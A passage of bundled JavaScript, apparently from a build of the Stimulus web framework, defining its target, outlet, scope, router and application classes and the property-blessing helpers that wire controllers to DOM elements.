      Object.keys(this.valueDescriptorMap).forEach((key) => {
        const descriptor = this.valueDescriptorMap[key];
        descriptors2[descriptor.name] = descriptor;
      });
      return descriptors2;
    }
    hasValue(attributeName) {
      const descriptor = this.valueDescriptorNameMap[attributeName];
      const hasMethodName = `has${capitalize(descriptor.name)}`;
      return this.receiver[hasMethodName];
    }
  };
  var TargetObserver = class {
    constructor(context, delegate) {
      this.context = context;
      this.delegate = delegate;
      this.targetsByName = new Multimap();
    }
    start() {
      if (!this.tokenListObserver) {
        this.tokenListObserver = new TokenListObserver(this.element, this.attributeName, this);
        this.tokenListObserver.start();
      }
    }
    stop() {
      if (this.tokenListObserver) {
        this.disconnectAllTargets();
        this.tokenListObserver.stop();
        delete this.tokenListObserver;
      }
    }
    tokenMatched({ element, content: name }) {
      if (this.scope.containsElement(element)) {
        this.connectTarget(element, name);
      }
    }
    tokenUnmatched({ element, content: name }) {
      this.disconnectTarget(element, name);
    }
    connectTarget(element, name) {
      var _a;
      if (!this.targetsByName.has(name, element)) {
        this.targetsByName.add(name, element);
        (_a = this.tokenListObserver) === null || _a === void 0 ? void 0 : _a.pause(() => this.delegate.targetConnected(element, name));
      }
    }
    disconnectTarget(element, name) {
      var _a;
      if (this.targetsByName.has(name, element)) {
        this.targetsByName.delete(name, element);
        (_a = this.tokenListObserver) === null || _a === void 0 ? void 0 : _a.pause(() => this.delegate.targetDisconnected(element, name));
      }
    }
    disconnectAllTargets() {
      for (const name of this.targetsByName.keys) {
        for (const element of this.targetsByName.getValuesForKey(name)) {
          this.disconnectTarget(element, name);
        }
      }
    }
    get attributeName() {
      return `data-${this.context.identifier}-target`;
    }
    get element() {
      return this.context.element;
    }
    get scope() {
      return this.context.scope;
    }
  };
  function readInheritableStaticArrayValues(constructor, propertyName) {
    const ancestors = getAncestorsForConstructor(constructor);
    return Array.from(ancestors.reduce((values, constructor2) => {
      getOwnStaticArrayValues(constructor2, propertyName).forEach((name) => values.add(name));
      return values;
    }, /* @__PURE__ */ new Set()));
  }
  function readInheritableStaticObjectPairs(constructor, propertyName) {
    const ancestors = getAncestorsForConstructor(constructor);
    return ancestors.reduce((pairs, constructor2) => {
      pairs.push(...getOwnStaticObjectPairs(constructor2, propertyName));
      return pairs;
    }, []);
  }
  function getAncestorsForConstructor(constructor) {
    const ancestors = [];
    while (constructor) {
      ancestors.push(constructor);
      constructor = Object.getPrototypeOf(constructor);
    }
    return ancestors.reverse();
  }
  function getOwnStaticArrayValues(constructor, propertyName) {
    const definition = constructor[propertyName];
    return Array.isArray(definition) ? definition : [];
  }
  function getOwnStaticObjectPairs(constructor, propertyName) {
    const definition = constructor[propertyName];
    return definition ? Object.keys(definition).map((key) => [key, definition[key]]) : [];
  }
  var OutletObserver = class {
    constructor(context, delegate) {
      this.started = false;
      this.context = context;
      this.delegate = delegate;
      this.outletsByName = new Multimap();
      this.outletElementsByName = new Multimap();
      this.selectorObserverMap = /* @__PURE__ */ new Map();
      this.attributeObserverMap = /* @__PURE__ */ new Map();
    }
    start() {
      if (!this.started) {
        this.outletDefinitions.forEach((outletName) => {
          this.setupSelectorObserverForOutlet(outletName);
          this.setupAttributeObserverForOutlet(outletName);
        });
        this.started = true;
        this.dependentContexts.forEach((context) => context.refresh());
      }
    }
    refresh() {
      this.selectorObserverMap.forEach((observer) => observer.refresh());
      this.attributeObserverMap.forEach((observer) => observer.refresh());
    }
    stop() {
      if (this.started) {
        this.started = false;
        this.disconnectAllOutlets();
        this.stopSelectorObservers();
        this.stopAttributeObservers();
      }
    }
    stopSelectorObservers() {
      if (this.selectorObserverMap.size > 0) {
        this.selectorObserverMap.forEach((observer) => observer.stop());
        this.selectorObserverMap.clear();
      }
    }
    stopAttributeObservers() {
      if (this.attributeObserverMap.size > 0) {
        this.attributeObserverMap.forEach((observer) => observer.stop());
        this.attributeObserverMap.clear();
      }
    }
    selectorMatched(element, _selector, { outletName }) {
      const outlet = this.getOutlet(element, outletName);
      if (outlet) {
        this.connectOutlet(outlet, element, outletName);
      }
    }
    selectorUnmatched(element, _selector, { outletName }) {
      const outlet = this.getOutletFromMap(element, outletName);
      if (outlet) {
        this.disconnectOutlet(outlet, element, outletName);
      }
    }
    selectorMatchElement(element, { outletName }) {
      const selector = this.selector(outletName);
      const hasOutlet = this.hasOutlet(element, outletName);
      const hasOutletController = element.matches(`[${this.schema.controllerAttribute}~=${outletName}]`);
      if (selector) {
        return hasOutlet && hasOutletController && element.matches(selector);
      } else {
        return false;
      }
    }
    elementMatchedAttribute(_element, attributeName) {
      const outletName = this.getOutletNameFromOutletAttributeName(attributeName);
      if (outletName) {
        this.updateSelectorObserverForOutlet(outletName);
      }
    }
    elementAttributeValueChanged(_element, attributeName) {
      const outletName = this.getOutletNameFromOutletAttributeName(attributeName);
      if (outletName) {
        this.updateSelectorObserverForOutlet(outletName);
      }
    }
    elementUnmatchedAttribute(_element, attributeName) {
      const outletName = this.getOutletNameFromOutletAttributeName(attributeName);
      if (outletName) {
        this.updateSelectorObserverForOutlet(outletName);
      }
    }
    connectOutlet(outlet, element, outletName) {
      var _a;
      if (!this.outletElementsByName.has(outletName, element)) {
        this.outletsByName.add(outletName, outlet);
        this.outletElementsByName.add(outletName, element);
        (_a = this.selectorObserverMap.get(outletName)) === null || _a === void 0 ? void 0 : _a.pause(() => this.delegate.outletConnected(outlet, element, outletName));
      }
    }
    disconnectOutlet(outlet, element, outletName) {
      var _a;
      if (this.outletElementsByName.has(outletName, element)) {
        this.outletsByName.delete(outletName, outlet);
        this.outletElementsByName.delete(outletName, element);
        (_a = this.selectorObserverMap.get(outletName)) === null || _a === void 0 ? void 0 : _a.pause(() => this.delegate.outletDisconnected(outlet, element, outletName));
      }
    }
    disconnectAllOutlets() {
      for (const outletName of this.outletElementsByName.keys) {
        for (const element of this.outletElementsByName.getValuesForKey(outletName)) {
          for (const outlet of this.outletsByName.getValuesForKey(outletName)) {
            this.disconnectOutlet(outlet, element, outletName);
          }
        }
      }
    }
    updateSelectorObserverForOutlet(outletName) {
      const observer = this.selectorObserverMap.get(outletName);
      if (observer) {
        observer.selector = this.selector(outletName);
      }
    }
    setupSelectorObserverForOutlet(outletName) {
      const selector = this.selector(outletName);
      const selectorObserver = new SelectorObserver(document.body, selector, this, { outletName });
      this.selectorObserverMap.set(outletName, selectorObserver);
      selectorObserver.start();
    }
    setupAttributeObserverForOutlet(outletName) {
      const attributeName = this.attributeNameForOutletName(outletName);
      const attributeObserver = new AttributeObserver(this.scope.element, attributeName, this);
      this.attributeObserverMap.set(outletName, attributeObserver);
      attributeObserver.start();
    }
    selector(outletName) {
      return this.scope.outlets.getSelectorForOutletName(outletName);
    }
    attributeNameForOutletName(outletName) {
      return this.scope.schema.outletAttributeForScope(this.identifier, outletName);
    }
    getOutletNameFromOutletAttributeName(attributeName) {
      return this.outletDefinitions.find((outletName) => this.attributeNameForOutletName(outletName) === attributeName);
    }
    get outletDependencies() {
      const dependencies = new Multimap();
      this.router.modules.forEach((module2) => {
        const constructor = module2.definition.controllerConstructor;
        const outlets = readInheritableStaticArrayValues(constructor, "outlets");
        outlets.forEach((outlet) => dependencies.add(outlet, module2.identifier));
      });
      return dependencies;
    }
    get outletDefinitions() {
      return this.outletDependencies.getKeysForValue(this.identifier);
    }
    get dependentControllerIdentifiers() {
      return this.outletDependencies.getValuesForKey(this.identifier);
    }
    get dependentContexts() {
      const identifiers = this.dependentControllerIdentifiers;
      return this.router.contexts.filter((context) => identifiers.includes(context.identifier));
    }
    hasOutlet(element, outletName) {
      return !!this.getOutlet(element, outletName) || !!this.getOutletFromMap(element, outletName);
    }
    getOutlet(element, outletName) {
      return this.application.getControllerForElementAndIdentifier(element, outletName);
    }
    getOutletFromMap(element, outletName) {
      return this.outletsByName.getValuesForKey(outletName).find((outlet) => outlet.element === element);
    }
    get scope() {
      return this.context.scope;
    }
    get schema() {
      return this.context.schema;
    }
    get identifier() {
      return this.context.identifier;
    }
    get application() {
      return this.context.application;
    }
    get router() {
      return this.application.router;
    }
  };
  var Context = class {
    constructor(module2, scope) {
      this.logDebugActivity = (functionName, detail = {}) => {
        const { identifier, controller, element } = this;
        detail = Object.assign({ identifier, controller, element }, detail);
        this.application.logDebugActivity(this.identifier, functionName, detail);
      };
      this.module = module2;
      this.scope = scope;
      this.controller = new module2.controllerConstructor(this);
      this.bindingObserver = new BindingObserver(this, this.dispatcher);
      this.valueObserver = new ValueObserver(this, this.controller);
      this.targetObserver = new TargetObserver(this, this);
      this.outletObserver = new OutletObserver(this, this);
      try {
        this.controller.initialize();
        this.logDebugActivity("initialize");
      } catch (error2) {
        this.handleError(error2, "initializing controller");
      }
    }
    connect() {
      this.bindingObserver.start();
      this.valueObserver.start();
      this.targetObserver.start();
      this.outletObserver.start();
      try {
        this.controller.connect();
        this.logDebugActivity("connect");
      } catch (error2) {
        this.handleError(error2, "connecting controller");
      }
    }
    refresh() {
      this.outletObserver.refresh();
    }
    disconnect() {
      try {
        this.controller.disconnect();
        this.logDebugActivity("disconnect");
      } catch (error2) {
        this.handleError(error2, "disconnecting controller");
      }
      this.outletObserver.stop();
      this.targetObserver.stop();
      this.valueObserver.stop();
      this.bindingObserver.stop();
    }
    get application() {
      return this.module.application;
    }
    get identifier() {
      return this.module.identifier;
    }
    get schema() {
      return this.application.schema;
    }
    get dispatcher() {
      return this.application.dispatcher;
    }
    get element() {
      return this.scope.element;
    }
    get parentElement() {
      return this.element.parentElement;
    }
    handleError(error2, message, detail = {}) {
      const { identifier, controller, element } = this;
      detail = Object.assign({ identifier, controller, element }, detail);
      this.application.handleError(error2, `Error ${message}`, detail);
    }
    targetConnected(element, name) {
      this.invokeControllerMethod(`${name}TargetConnected`, element);
    }
    targetDisconnected(element, name) {
      this.invokeControllerMethod(`${name}TargetDisconnected`, element);
    }
    outletConnected(outlet, element, name) {
      this.invokeControllerMethod(`${namespaceCamelize(name)}OutletConnected`, outlet, element);
    }
    outletDisconnected(outlet, element, name) {
      this.invokeControllerMethod(`${namespaceCamelize(name)}OutletDisconnected`, outlet, element);
    }
    invokeControllerMethod(methodName, ...args) {
      const controller = this.controller;
      if (typeof controller[methodName] == "function") {
        controller[methodName](...args);
      }
    }
  };
  function bless(constructor) {
    return shadow(constructor, getBlessedProperties(constructor));
  }
  function shadow(constructor, properties) {
    const shadowConstructor = extend2(constructor);
    const shadowProperties = getShadowProperties(constructor.prototype, properties);
    Object.defineProperties(shadowConstructor.prototype, shadowProperties);
    return shadowConstructor;
  }
  function getBlessedProperties(constructor) {
    const blessings = readInheritableStaticArrayValues(constructor, "blessings");
    return blessings.reduce((blessedProperties, blessing) => {
      const properties = blessing(constructor);
      for (const key in properties) {
        const descriptor = blessedProperties[key] || {};
        blessedProperties[key] = Object.assign(descriptor, properties[key]);
      }
      return blessedProperties;
    }, {});
  }
  function getShadowProperties(prototype3, properties) {
    return getOwnKeys(properties).reduce((shadowProperties, key) => {
      const descriptor = getShadowedDescriptor(prototype3, properties, key);
      if (descriptor) {
        Object.assign(shadowProperties, { [key]: descriptor });
      }
      return shadowProperties;
    }, {});
  }
  function getShadowedDescriptor(prototype3, properties, key) {
    const shadowingDescriptor = Object.getOwnPropertyDescriptor(prototype3, key);
    const shadowedByValue = shadowingDescriptor && "value" in shadowingDescriptor;
    if (!shadowedByValue) {
      const descriptor = Object.getOwnPropertyDescriptor(properties, key).value;
      if (shadowingDescriptor) {
        descriptor.get = shadowingDescriptor.get || descriptor.get;
        descriptor.set = shadowingDescriptor.set || descriptor.set;
      }
      return descriptor;
    }
  }
  var getOwnKeys = (() => {
    if (typeof Object.getOwnPropertySymbols == "function") {
      return (object) => [...Object.getOwnPropertyNames(object), ...Object.getOwnPropertySymbols(object)];
    } else {
      return Object.getOwnPropertyNames;
    }
  })();
  var extend2 = (() => {
    function extendWithReflect(constructor) {
      function extended() {
        return Reflect.construct(constructor, arguments, new.target);
      }
      extended.prototype = Object.create(constructor.prototype, {
        constructor: { value: extended }
      });
      Reflect.setPrototypeOf(extended, constructor);
      return extended;
    }
    function testReflectExtension() {
      const a = function() {
        this.a.call(this);
      };
      const b = extendWithReflect(a);
      b.prototype.a = function() {
      };
      return new b();
    }
    try {
      testReflectExtension();
      return extendWithReflect;
    } catch (error2) {
      return (constructor) => class extended extends constructor {
      };
    }
  })();
  function blessDefinition(definition) {
    return {
      identifier: definition.identifier,
      controllerConstructor: bless(definition.controllerConstructor)
    };
  }
  var Module = class {
    constructor(application2, definition) {
      this.application = application2;
      this.definition = blessDefinition(definition);
      this.contextsByScope = /* @__PURE__ */ new WeakMap();
      this.connectedContexts = /* @__PURE__ */ new Set();
    }
    get identifier() {
      return this.definition.identifier;
    }
    get controllerConstructor() {
      return this.definition.controllerConstructor;
    }
    get contexts() {
      return Array.from(this.connectedContexts);
    }
    connectContextForScope(scope) {
      const context = this.fetchContextForScope(scope);
      this.connectedContexts.add(context);
      context.connect();
    }
    disconnectContextForScope(scope) {
      const context = this.contextsByScope.get(scope);
      if (context) {
        this.connectedContexts.delete(context);
        context.disconnect();
      }
    }
    fetchContextForScope(scope) {
      let context = this.contextsByScope.get(scope);
      if (!context) {
        context = new Context(this, scope);
        this.contextsByScope.set(scope, context);
      }
      return context;
    }
  };
  var ClassMap = class {
    constructor(scope) {
      this.scope = scope;
    }
    has(name) {
      return this.data.has(this.getDataKey(name));
    }
    get(name) {
      return this.getAll(name)[0];
    }
    getAll(name) {
      const tokenString = this.data.get(this.getDataKey(name)) || "";
      return tokenize(tokenString);
    }
    getAttributeName(name) {
      return this.data.getAttributeNameForKey(this.getDataKey(name));
    }
    getDataKey(name) {
      return `${name}-class`;
    }
    get data() {
      return this.scope.data;
    }
  };
  var DataMap = class {
    constructor(scope) {
      this.scope = scope;
    }
    get element() {
      return this.scope.element;
    }
    get identifier() {
      return this.scope.identifier;
    }
    get(key) {
      const name = this.getAttributeNameForKey(key);
      return this.element.getAttribute(name);
    }
    set(key, value) {
      const name = this.getAttributeNameForKey(key);
      this.element.setAttribute(name, value);
      return this.get(key);
    }
    has(key) {
      const name = this.getAttributeNameForKey(key);
      return this.element.hasAttribute(name);
    }
    delete(key) {
      if (this.has(key)) {
        const name = this.getAttributeNameForKey(key);
        this.element.removeAttribute(name);
        return true;
      } else {
        return false;
      }
    }
    getAttributeNameForKey(key) {
      return `data-${this.identifier}-${dasherize(key)}`;
    }
  };
  var Guide = class {
    constructor(logger) {
      this.warnedKeysByObject = /* @__PURE__ */ new WeakMap();
      this.logger = logger;
    }
    warn(object, key, message) {
      let warnedKeys = this.warnedKeysByObject.get(object);
      if (!warnedKeys) {
        warnedKeys = /* @__PURE__ */ new Set();
        this.warnedKeysByObject.set(object, warnedKeys);
      }
      if (!warnedKeys.has(key)) {
        warnedKeys.add(key);
        this.logger.warn(message, object);
      }
    }
  };
  function attributeValueContainsToken(attributeName, token) {
    return `[${attributeName}~="${token}"]`;
  }
  var TargetSet = class {
    constructor(scope) {
      this.scope = scope;
    }
    get element() {
      return this.scope.element;
    }
    get identifier() {
      return this.scope.identifier;
    }
    get schema() {
      return this.scope.schema;
    }
    has(targetName) {
      return this.find(targetName) != null;
    }
    find(...targetNames) {
      return targetNames.reduce((target, targetName) => target || this.findTarget(targetName) || this.findLegacyTarget(targetName), void 0);
    }
    findAll(...targetNames) {
      return targetNames.reduce((targets, targetName) => [
        ...targets,
        ...this.findAllTargets(targetName),
        ...this.findAllLegacyTargets(targetName)
      ], []);
    }
    findTarget(targetName) {
      const selector = this.getSelectorForTargetName(targetName);
      return this.scope.findElement(selector);
    }
    findAllTargets(targetName) {
      const selector = this.getSelectorForTargetName(targetName);
      return this.scope.findAllElements(selector);
    }
    getSelectorForTargetName(targetName) {
      const attributeName = this.schema.targetAttributeForScope(this.identifier);
      return attributeValueContainsToken(attributeName, targetName);
    }
    findLegacyTarget(targetName) {
      const selector = this.getLegacySelectorForTargetName(targetName);
      return this.deprecate(this.scope.findElement(selector), targetName);
    }
    findAllLegacyTargets(targetName) {
      const selector = this.getLegacySelectorForTargetName(targetName);
      return this.scope.findAllElements(selector).map((element) => this.deprecate(element, targetName));
    }
    getLegacySelectorForTargetName(targetName) {
      const targetDescriptor = `${this.identifier}.${targetName}`;
      return attributeValueContainsToken(this.schema.targetAttribute, targetDescriptor);
    }
    deprecate(element, targetName) {
      if (element) {
        const { identifier } = this;
        const attributeName = this.schema.targetAttribute;
        const revisedAttributeName = this.schema.targetAttributeForScope(identifier);
        this.guide.warn(element, `target:${targetName}`, `Please replace ${attributeName}="${identifier}.${targetName}" with ${revisedAttributeName}="${targetName}". The ${attributeName} attribute is deprecated and will be removed in a future version of Stimulus.`);
      }
      return element;
    }
    get guide() {
      return this.scope.guide;
    }
  };
  var OutletSet = class {
    constructor(scope, controllerElement) {
      this.scope = scope;
      this.controllerElement = controllerElement;
    }
    get element() {
      return this.scope.element;
    }
    get identifier() {
      return this.scope.identifier;
    }
    get schema() {
      return this.scope.schema;
    }
    has(outletName) {
      return this.find(outletName) != null;
    }
    find(...outletNames) {
      return outletNames.reduce((outlet, outletName) => outlet || this.findOutlet(outletName), void 0);
    }
    findAll(...outletNames) {
      return outletNames.reduce((outlets, outletName) => [...outlets, ...this.findAllOutlets(outletName)], []);
    }
    getSelectorForOutletName(outletName) {
      const attributeName = this.schema.outletAttributeForScope(this.identifier, outletName);
      return this.controllerElement.getAttribute(attributeName);
    }
    findOutlet(outletName) {
      const selector = this.getSelectorForOutletName(outletName);
      if (selector)
        return this.findElement(selector, outletName);
    }
    findAllOutlets(outletName) {
      const selector = this.getSelectorForOutletName(outletName);
      return selector ? this.findAllElements(selector, outletName) : [];
    }
    findElement(selector, outletName) {
      const elements = this.scope.queryElements(selector);
      return elements.filter((element) => this.matchesElement(element, selector, outletName))[0];
    }
    findAllElements(selector, outletName) {
      const elements = this.scope.queryElements(selector);
      return elements.filter((element) => this.matchesElement(element, selector, outletName));
    }
    matchesElement(element, selector, outletName) {
      const controllerAttribute = element.getAttribute(this.scope.schema.controllerAttribute) || "";
      return element.matches(selector) && controllerAttribute.split(" ").includes(outletName);
    }
  };
  var Scope = class _Scope {
    constructor(schema, element, identifier, logger) {
      this.targets = new TargetSet(this);
      this.classes = new ClassMap(this);
      this.data = new DataMap(this);
      this.containsElement = (element2) => {
        return element2.closest(this.controllerSelector) === this.element;
      };
      this.schema = schema;
      this.element = element;
      this.identifier = identifier;
      this.guide = new Guide(logger);
      this.outlets = new OutletSet(this.documentScope, element);
    }
    findElement(selector) {
      return this.element.matches(selector) ? this.element : this.queryElements(selector).find(this.containsElement);
    }
    findAllElements(selector) {
      return [
        ...this.element.matches(selector) ? [this.element] : [],
        ...this.queryElements(selector).filter(this.containsElement)
      ];
    }
    queryElements(selector) {
      return Array.from(this.element.querySelectorAll(selector));
    }
    get controllerSelector() {
      return attributeValueContainsToken(this.schema.controllerAttribute, this.identifier);
    }
    get isDocumentScope() {
      return this.element === document.documentElement;
    }
    get documentScope() {
      return this.isDocumentScope ? this : new _Scope(this.schema, document.documentElement, this.identifier, this.guide.logger);
    }
  };
  var ScopeObserver = class {
    constructor(element, schema, delegate) {
      this.element = element;
      this.schema = schema;
      this.delegate = delegate;
      this.valueListObserver = new ValueListObserver(this.element, this.controllerAttribute, this);
      this.scopesByIdentifierByElement = /* @__PURE__ */ new WeakMap();
      this.scopeReferenceCounts = /* @__PURE__ */ new WeakMap();
    }
    start() {
      this.valueListObserver.start();
    }
    stop() {
      this.valueListObserver.stop();
    }
    get controllerAttribute() {
      return this.schema.controllerAttribute;
    }
    parseValueForToken(token) {
      const { element, content: identifier } = token;
      return this.parseValueForElementAndIdentifier(element, identifier);
    }
    parseValueForElementAndIdentifier(element, identifier) {
      const scopesByIdentifier = this.fetchScopesByIdentifierForElement(element);
      let scope = scopesByIdentifier.get(identifier);
      if (!scope) {
        scope = this.delegate.createScopeForElementAndIdentifier(element, identifier);
        scopesByIdentifier.set(identifier, scope);
      }
      return scope;
    }
    elementMatchedValue(element, value) {
      const referenceCount = (this.scopeReferenceCounts.get(value) || 0) + 1;
      this.scopeReferenceCounts.set(value, referenceCount);
      if (referenceCount == 1) {
        this.delegate.scopeConnected(value);
      }
    }
    elementUnmatchedValue(element, value) {
      const referenceCount = this.scopeReferenceCounts.get(value);
      if (referenceCount) {
        this.scopeReferenceCounts.set(value, referenceCount - 1);
        if (referenceCount == 1) {
          this.delegate.scopeDisconnected(value);
        }
      }
    }
    fetchScopesByIdentifierForElement(element) {
      let scopesByIdentifier = this.scopesByIdentifierByElement.get(element);
      if (!scopesByIdentifier) {
        scopesByIdentifier = /* @__PURE__ */ new Map();
        this.scopesByIdentifierByElement.set(element, scopesByIdentifier);
      }
      return scopesByIdentifier;
    }
  };
  var Router = class {
    constructor(application2) {
      this.application = application2;
      this.scopeObserver = new ScopeObserver(this.element, this.schema, this);
      this.scopesByIdentifier = new Multimap();
      this.modulesByIdentifier = /* @__PURE__ */ new Map();
    }
    get element() {
      return this.application.element;
    }
    get schema() {
      return this.application.schema;
    }
    get logger() {
      return this.application.logger;
    }
    get controllerAttribute() {
      return this.schema.controllerAttribute;
    }
    get modules() {
      return Array.from(this.modulesByIdentifier.values());
    }
    get contexts() {
      return this.modules.reduce((contexts, module2) => contexts.concat(module2.contexts), []);
    }
    start() {
      this.scopeObserver.start();
    }
    stop() {
      this.scopeObserver.stop();
    }
    loadDefinition(definition) {
      this.unloadIdentifier(definition.identifier);
      const module2 = new Module(this.application, definition);
      this.connectModule(module2);
      const afterLoad = definition.controllerConstructor.afterLoad;
      if (afterLoad) {
        afterLoad.call(definition.controllerConstructor, definition.identifier, this.application);
      }
    }
    unloadIdentifier(identifier) {
      const module2 = this.modulesByIdentifier.get(identifier);
      if (module2) {
        this.disconnectModule(module2);
      }
    }
    getContextForElementAndIdentifier(element, identifier) {
      const module2 = this.modulesByIdentifier.get(identifier);
      if (module2) {
        return module2.contexts.find((context) => context.element == element);
      }
    }
    proposeToConnectScopeForElementAndIdentifier(element, identifier) {
      const scope = this.scopeObserver.parseValueForElementAndIdentifier(element, identifier);
      if (scope) {
        this.scopeObserver.elementMatchedValue(scope.element, scope);
      } else {
        console.error(`Couldn't find or create scope for identifier: "${identifier}" and element:`, element);
      }
    }
    handleError(error2, message, detail) {
      this.application.handleError(error2, message, detail);
    }
    createScopeForElementAndIdentifier(element, identifier) {
      return new Scope(this.schema, element, identifier, this.logger);
    }
    scopeConnected(scope) {
      this.scopesByIdentifier.add(scope.identifier, scope);
      const module2 = this.modulesByIdentifier.get(scope.identifier);
      if (module2) {
        module2.connectContextForScope(scope);
      }
    }
    scopeDisconnected(scope) {
      this.scopesByIdentifier.delete(scope.identifier, scope);
      const module2 = this.modulesByIdentifier.get(scope.identifier);
      if (module2) {
        module2.disconnectContextForScope(scope);
      }
    }
    connectModule(module2) {
      this.modulesByIdentifier.set(module2.identifier, module2);
      const scopes = this.scopesByIdentifier.getValuesForKey(module2.identifier);
      scopes.forEach((scope) => module2.connectContextForScope(scope));
    }
    disconnectModule(module2) {
      this.modulesByIdentifier.delete(module2.identifier);
      const scopes = this.scopesByIdentifier.getValuesForKey(module2.identifier);
      scopes.forEach((scope) => module2.disconnectContextForScope(scope));
    }
  };
  var defaultSchema = {
    controllerAttribute: "data-controller",
    actionAttribute: "data-action",
    targetAttribute: "data-target",
    targetAttributeForScope: (identifier) => `data-${identifier}-target`,
    outletAttributeForScope: (identifier, outlet) => `data-${identifier}-${outlet}-outlet`,
    keyMappings: Object.assign(Object.assign({ enter: "Enter", tab: "Tab", esc: "Escape", space: " ", up: "ArrowUp", down: "ArrowDown", left: "ArrowLeft", right: "ArrowRight", home: "Home", end: "End", page_up: "PageUp", page_down: "PageDown" }, objectFromEntries("abcdefghijklmnopqrstuvwxyz".split("").map((c) => [c, c]))), objectFromEntries("0123456789".split("").map((n) => [n, n])))
  };
  function objectFromEntries(array) {
    return array.reduce((memo, [k, v]) => Object.assign(Object.assign({}, memo), { [k]: v }), {});
  }
  var Application = class {
    constructor(element = document.documentElement, schema = defaultSchema) {
      this.logger = console;
      this.debug = false;
      this.logDebugActivity = (identifier, functionName, detail = {}) => {
        if (this.debug) {
          this.logFormattedMessage(identifier, functionName, detail);
        }
      };
      this.element = element;
      this.schema = schema;
      this.dispatcher = new Dispatcher(this);
      this.router = new Router(this);
      this.actionDescriptorFilters = Object.assign({}, defaultActionDescriptorFilters);
    }
    static start(element, schema) {
      const application2 = new this(element, schema);
      application2.start();
      return application2;
    }
    async start() {
      await domReady();
      this.logDebugActivity("application", "starting");
      this.dispatcher.start();
      this.router.start();
      this.logDebugActivity("application", "start");
    }
    stop() {
      this.logDebugActivity("application", "stopping");
      this.dispatcher.stop();
      this.router.stop();
      this.logDebugActivity("application", "stop");
    }
    register(identifier, controllerConstructor) {
      this.load({ identifier, controllerConstructor });
    }
    registerActionOption(name, filter2) {
      this.actionDescriptorFilters[name] = filter2;
    }
    load(head, ...rest) {
      const definitions = Array.isArray(head) ? head : [head, ...rest];
      definitions.forEach((definition) => {
        if (definition.controllerConstructor.shouldLoad) {
          this.router.loadDefinition(definition);
        }
      });
    }
    unload(head, ...rest) {
      const identifiers = Array.isArray(head) ? head : [head, ...rest];
      identifiers.forEach((identifier) => this.router.unloadIdentifier(identifier));
    }
    get controllers() {
      return this.router.contexts.map((context) => context.controller);
    }
    getControllerForElementAndIdentifier(element, identifier) {
      const context = this.router.getContextForElementAndIdentifier(element, identifier);
      return context ? context.controller : null;
    }
    handleError(error2, message, detail) {
      var _a;
      this.logger.error(`%s

%o

%o`, message, error2, detail);
      (_a = window.onerror) === null || _a === void 0 ? void 0 : _a.call(window, message, "", 0, 0, error2);
    }
    logFormattedMessage(identifier, functionName, detail = {}) {
      detail = Object.assign({ application: this }, detail);
      this.logger.groupCollapsed(`${identifier} #${functionName}`);
      this.logger.log("details:", Object.assign({}, detail));
      this.logger.groupEnd();
    }
  };
  function domReady() {
    return new Promise((resolve) => {
      if (document.readyState == "loading") {
        document.addEventListener("DOMContentLoaded", () => resolve());
      } else {
        resolve();
      }
    });
  }
  function ClassPropertiesBlessing(constructor) {
    const classes = readInheritableStaticArrayValues(constructor, "classes");
    return classes.reduce((properties, classDefinition) => {
      return Object.assign(properties, propertiesForClassDefinition(classDefinition));
    }, {});
  }
  function propertiesForClassDefinition(key) {
    return {
      [`${key}Class`]: {
        get() {
          const { classes } = this;
          if (classes.has(key)) {
            return classes.get(key);
          } else {
            const attribute = classes.getAttributeName(key);
            throw new Error(`Missing attribute "${attribute}"`);
          }
        }
      },
      [`${key}Classes`]: {
        get() {
          return this.classes.getAll(key);
        }
      },
      [`has${capitalize(key)}Class`]: {
        get() {
          return this.classes.has(key);
        }
      }
    };
  }
  function OutletPropertiesBlessing(constructor) {
    const outlets = readInheritableStaticArrayValues(constructor, "outlets");
    return outlets.reduce((properties, outletDefinition) => {
      return Object.assign(properties, propertiesForOutletDefinition(outletDefinition));
    }, {});
  }
  function getOutletController(controller, element, identifier) {
    return controller.application.getControllerForElementAndIdentifier(element, identifier);
  }
  function getControllerAndEnsureConnectedScope(controller, element, outletName) {
    let outletController = getOutletController(controller, element, outletName);
    if (outletController)
      return outletController;
    controller.application.router.proposeToConnectScopeForElementAndIdentifier(element, outletName);
    outletController = getOutletController(controller, element, outletName);
    if (outletController)
      return outletController;
  }
  function propertiesForOutletDefinition(name) {
    const camelizedName = namespaceCamelize(name);
    return {
      [`${camelizedName}Outlet`]: {
        get() {
          const outletElement = this.outlets.find(name);
          const selector = this.outlets.getSelectorForOutletName(name);
          if (outletElement) {
            const outletController = getControllerAndEnsureConnectedScope(this, outletElement, name);
            if (outletController)
              return outletController;
            throw new Error(`The provided outlet element is missing an outlet controller "${name}" instance for host controller "${this.identifier}"`);
          }
          throw new Error(`Missing outlet element "${name}" for host controller "${this.identifier}". Stimulus couldn't find a matching outlet element using selector "${selector}".`);
        }
      },
      [`${camelizedName}Outlets`]: {
        get() {
          const outlets = this.outlets.findAll(name);
          if (outlets.length > 0) {
            return outlets.map((outletElement) => {
              const outletController = getControllerAndEnsureConnectedScope(this, outletElement, name);
              if (outletController)
                return outletController;
              console.warn(`The provided outlet element is missing an outlet controller "${name}" instance for host controller "${this.identifier}"`, outletElement);
            }).filter((controller) => controller);
          }
          return [];
        }
      },
      [`${camelizedName}OutletElement`]: {
        get() {
          const outletElement = this.outlets.find(name);
          const selector = this.outlets.getSelectorForOutletName(name);
          if (outletElement) {
            return outletElement;
          } else {
            throw new Error(`Missing outlet element "${name}" for host controller "${this.identifier}". Stimulus couldn't find a matching outlet element using selector "${selector}".`);
          }
        }
      },
      [`${camelizedName}OutletElements`]: {
        get() {
          return this.outlets.findAll(name);
        }
      },
      [`has${capitalize(camelizedName)}Outlet`]: {
        get() {
          return this.outlets.has(name);
        }
      }
    };
  }
  function TargetPropertiesBlessing(constructor) {
    const targets = readInheritableStaticArrayValues(constructor, "targets");
    return targets.reduce((properties, targetDefinition) => {
      return Object.assign(properties, propertiesForTargetDefinition(targetDefinition));
    }, {});
  }
  function propertiesForTargetDefinition(name) {
    return {
      [`${name}Target`]: {
        get() {
          const target = this.targets.find(name);
          if (target) {
            return target;
          } else {
            throw new Error(`Missing target element "${name}" for "${this.identifier}" controller`);
          }
        }
      },
      [`${name}Targets`]: {
        get() {
          return this.targets.findAll(name);
        }
      },
      [`has${capitalize(name)}Target`]: {
        get() {
          return this.targets.has(name);
        }
      }
    };
  }
  function ValuePropertiesBlessing(constructor) {
    const valueDefinitionPairs = readInheritableStaticObjectPairs(constructor, "values");
    const propertyDescriptorMap = {
      valueDescriptorMap: {
        get() {
          return valueDefinitionPairs.reduce((result, valueDefinitionPair) => {
